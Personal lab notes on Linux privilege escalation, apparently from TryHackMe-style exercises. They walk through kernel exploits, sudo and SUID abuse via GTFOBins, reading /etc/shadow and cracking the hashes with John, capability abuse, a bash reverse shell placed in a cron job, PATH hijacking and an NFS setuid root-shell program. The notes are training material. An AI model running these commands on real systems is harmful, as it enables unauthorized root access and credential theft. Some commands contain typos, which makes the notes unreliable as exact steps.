Previlege Escalation (P.E)
	
(1)
 Kernel Exploit-Based Privilege Escalation
	 
	 	Now in this P.E we mainly use kernel
	 		first step we have to gain access 
	 			then we have to check what kernel we are running
	 				cmd : uname -r
	Once we get the kernel then firstly we go to search engine and then search for the version exploit if available and go accordingly
		in this case i got a file i have yo download it to our local downloads
			inside downloads directory open a local server 
				cmd : python3 -m http.server 8000
					with this my server is up and running
	Now got to the ssh and go to root/tmp file as download to root is not permissible then download	
		cmd : wget http://<Local IP>:8000/File name
			confirm the download through "ls"
				once recieved compile the .sh file 
					gcc <file name.sh> -o <any name in this case exploit> 
						next give access to run 
							cmd : chmod +x <filename(exploit)>
							Next run the command
								./exploit
									We will have root access.
		
(2)
Sudo Based-Privilege Escalation

	This Escalation is simple
		First we have to do is to see what all access we have on sudo
			cmd : sudo -l
				as per this command we can see we have three access 
	For sudo privilege escalation we always use a site called GTO bins
		from there we can select nano as here we selected nano 	after tat do as site says
			we'll gain sudo access
				web site : https://gtfobins.github.io/
				
			
(3)
SUID Based-Privilege Escalation

	In here first well use this command to see all the s based file
		cmd : find / -type f -perm -04000 -ls 2>/dev/null
			this will show us the files
				after that go to the website and manually try out all the files until you get a suid option 
					web site : https://gtfobins.github.io/
						in this we got base64 so we went with that, we wanted a access to user2
							for that we first i ran the command 2 specify what file i want to decode
								cmd: LFILE=/etc/shadow
									then i ran a commoand to decode it 
										cmd: /usr/bin/base64 "$LFILE" | base64 --decode
											this opened up all the hashes for the usernames from here we got hashes for user2
	Next step we use john to crack the hash 
		first we have to save the hash to local directory 
			cmd: nano <hash> filename
	then we use john to crack it
		cmd: John --wordlist=/usr/share/wordlists/rockyou.txt <filename>
			we'll get password
				change user to user2 
					cmd: su user2
	even in this user we cant access flag3.txt
		so we'll do the same as we did above
			specify the file i want to decode
				cmd: LFILE=/home/ubuntu/flag3.txt
					next command to decode it
						cmd: usr/bin/base64 "$LFILE" | base64 --decode
							nowwe can see the file.
							
(4)
Capabilties Based-Privilege Escalation

	first we'll have to check how many set capabilities are there and what are them 
		cmd: getcap -r / 2>/dev/null
			then we'll cross check the capabilities with the gtfo bin website
				web site : https://gtfobins.github.io/
					once we get the match we'll execute the command we found in the website (always change python to python3 also add the capabilities path)
							cmd:  /home/ubuntu/view ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'    <here "view" was the capabiltiy>
	next we'll be a root user.

(5)
Cron-Jobs Based-Privlege Escalation

	First we'll have to see all the crontabs running
		cmd: cat /etc/crontab
			here it will show all the running crontab from there we'll have to select the appropriate crontab 
				and from there check whether the file is writable 
					cmd: ls -la <path>filename>
						then nano the file and insert a bash reverse shell script in this case i used 
							cmd: bash -i >& /dev/tcp/<Local IP>/<Port> 0>&1
								also before running the shell start a netcat listening 
									cmd: nc -lvnp <Port>
										then run the command
											sometimes it wont work so we'll have to manualy run	
												cmd: chmod +x <filename>
													we'll have access as a root

(6)
PATH Based-Previlege Escalation

	First we'll have to see is there any file running without the path
		once we find something like that we will have to create a temp file in the $PATH
			to see $PATH cmd: $PATH
				after that create a temp file that will be first
					cmd: export PATH=/tmp:$PATH
						this will create a path next we'll have to create a file inside the path
							in this case we need a file called thm so we'll have to create using nano
								cmd: nano thm (inside the file include the command /bin/bash)
	Next we'll have to give it set UID  permission
		cmd: chmod +s thm
	Next we'll have to give it executable permission
		cmd: chmos +x thm
	Next we'll give it complete read,write,execute permission
		cmd: chmod 777 thm
	Next we chck the permission 
		cmd: ls -la
			if everything is alright then we'll go back to the first file
				and run it 	
					cmd: ./test (in this case file name was "test")
	all goes wll we'll have root access.
								
(7)
NFS Based-Privilege Escalation

				(local)
	In this method first we have to check what all mounts are available in target machine
		cmd: showmount -e <Target Ip>
				(Target)	 
	next in target machine confirm these through 
		cmd: cat /etc/exports
			mainly first thing we have to notice in this method is that while we see the exports we have to have rw access and also root_no_squash
				in this case we have three directories like that 
					i'll pick /home/ubuntu/sharedfolder
							(Local)
						next we'll have to create a mount in our local system to transfer binary
							go to /root/mnt create a dir any name
								cmd: mkdir <name>
									run the command to link remote NFS
										cmd: mount -o rw <target ip>:/home/ubuntu/sharedfolder /mnt/<dir name>
											next we create a folder and add a c script for privilege escalation
												cmd: nano code.cd
												
													script: // rootshell.c
														#include <stdio.h>
														#include <stdlib.h>
														#include <unistd.h>

														int main() {
														    setuid(0);    // Switch to root user
														    setgid(0);    // Switch to root group
														    system("/bin/bash");  // Launch a root shell
														    return 0;
														}
												Next we compile the script as my glibc is new version we'llhave to static compile
													cmd: gcc -static code.c -o code
														then we'll give run and suidbit permission
															cmd: chmod +x code
															     chmod +s code
												     (Target)
	Next we run the file in target machine
		cmd: ./sharedfolders
			we'll have root access.												
					
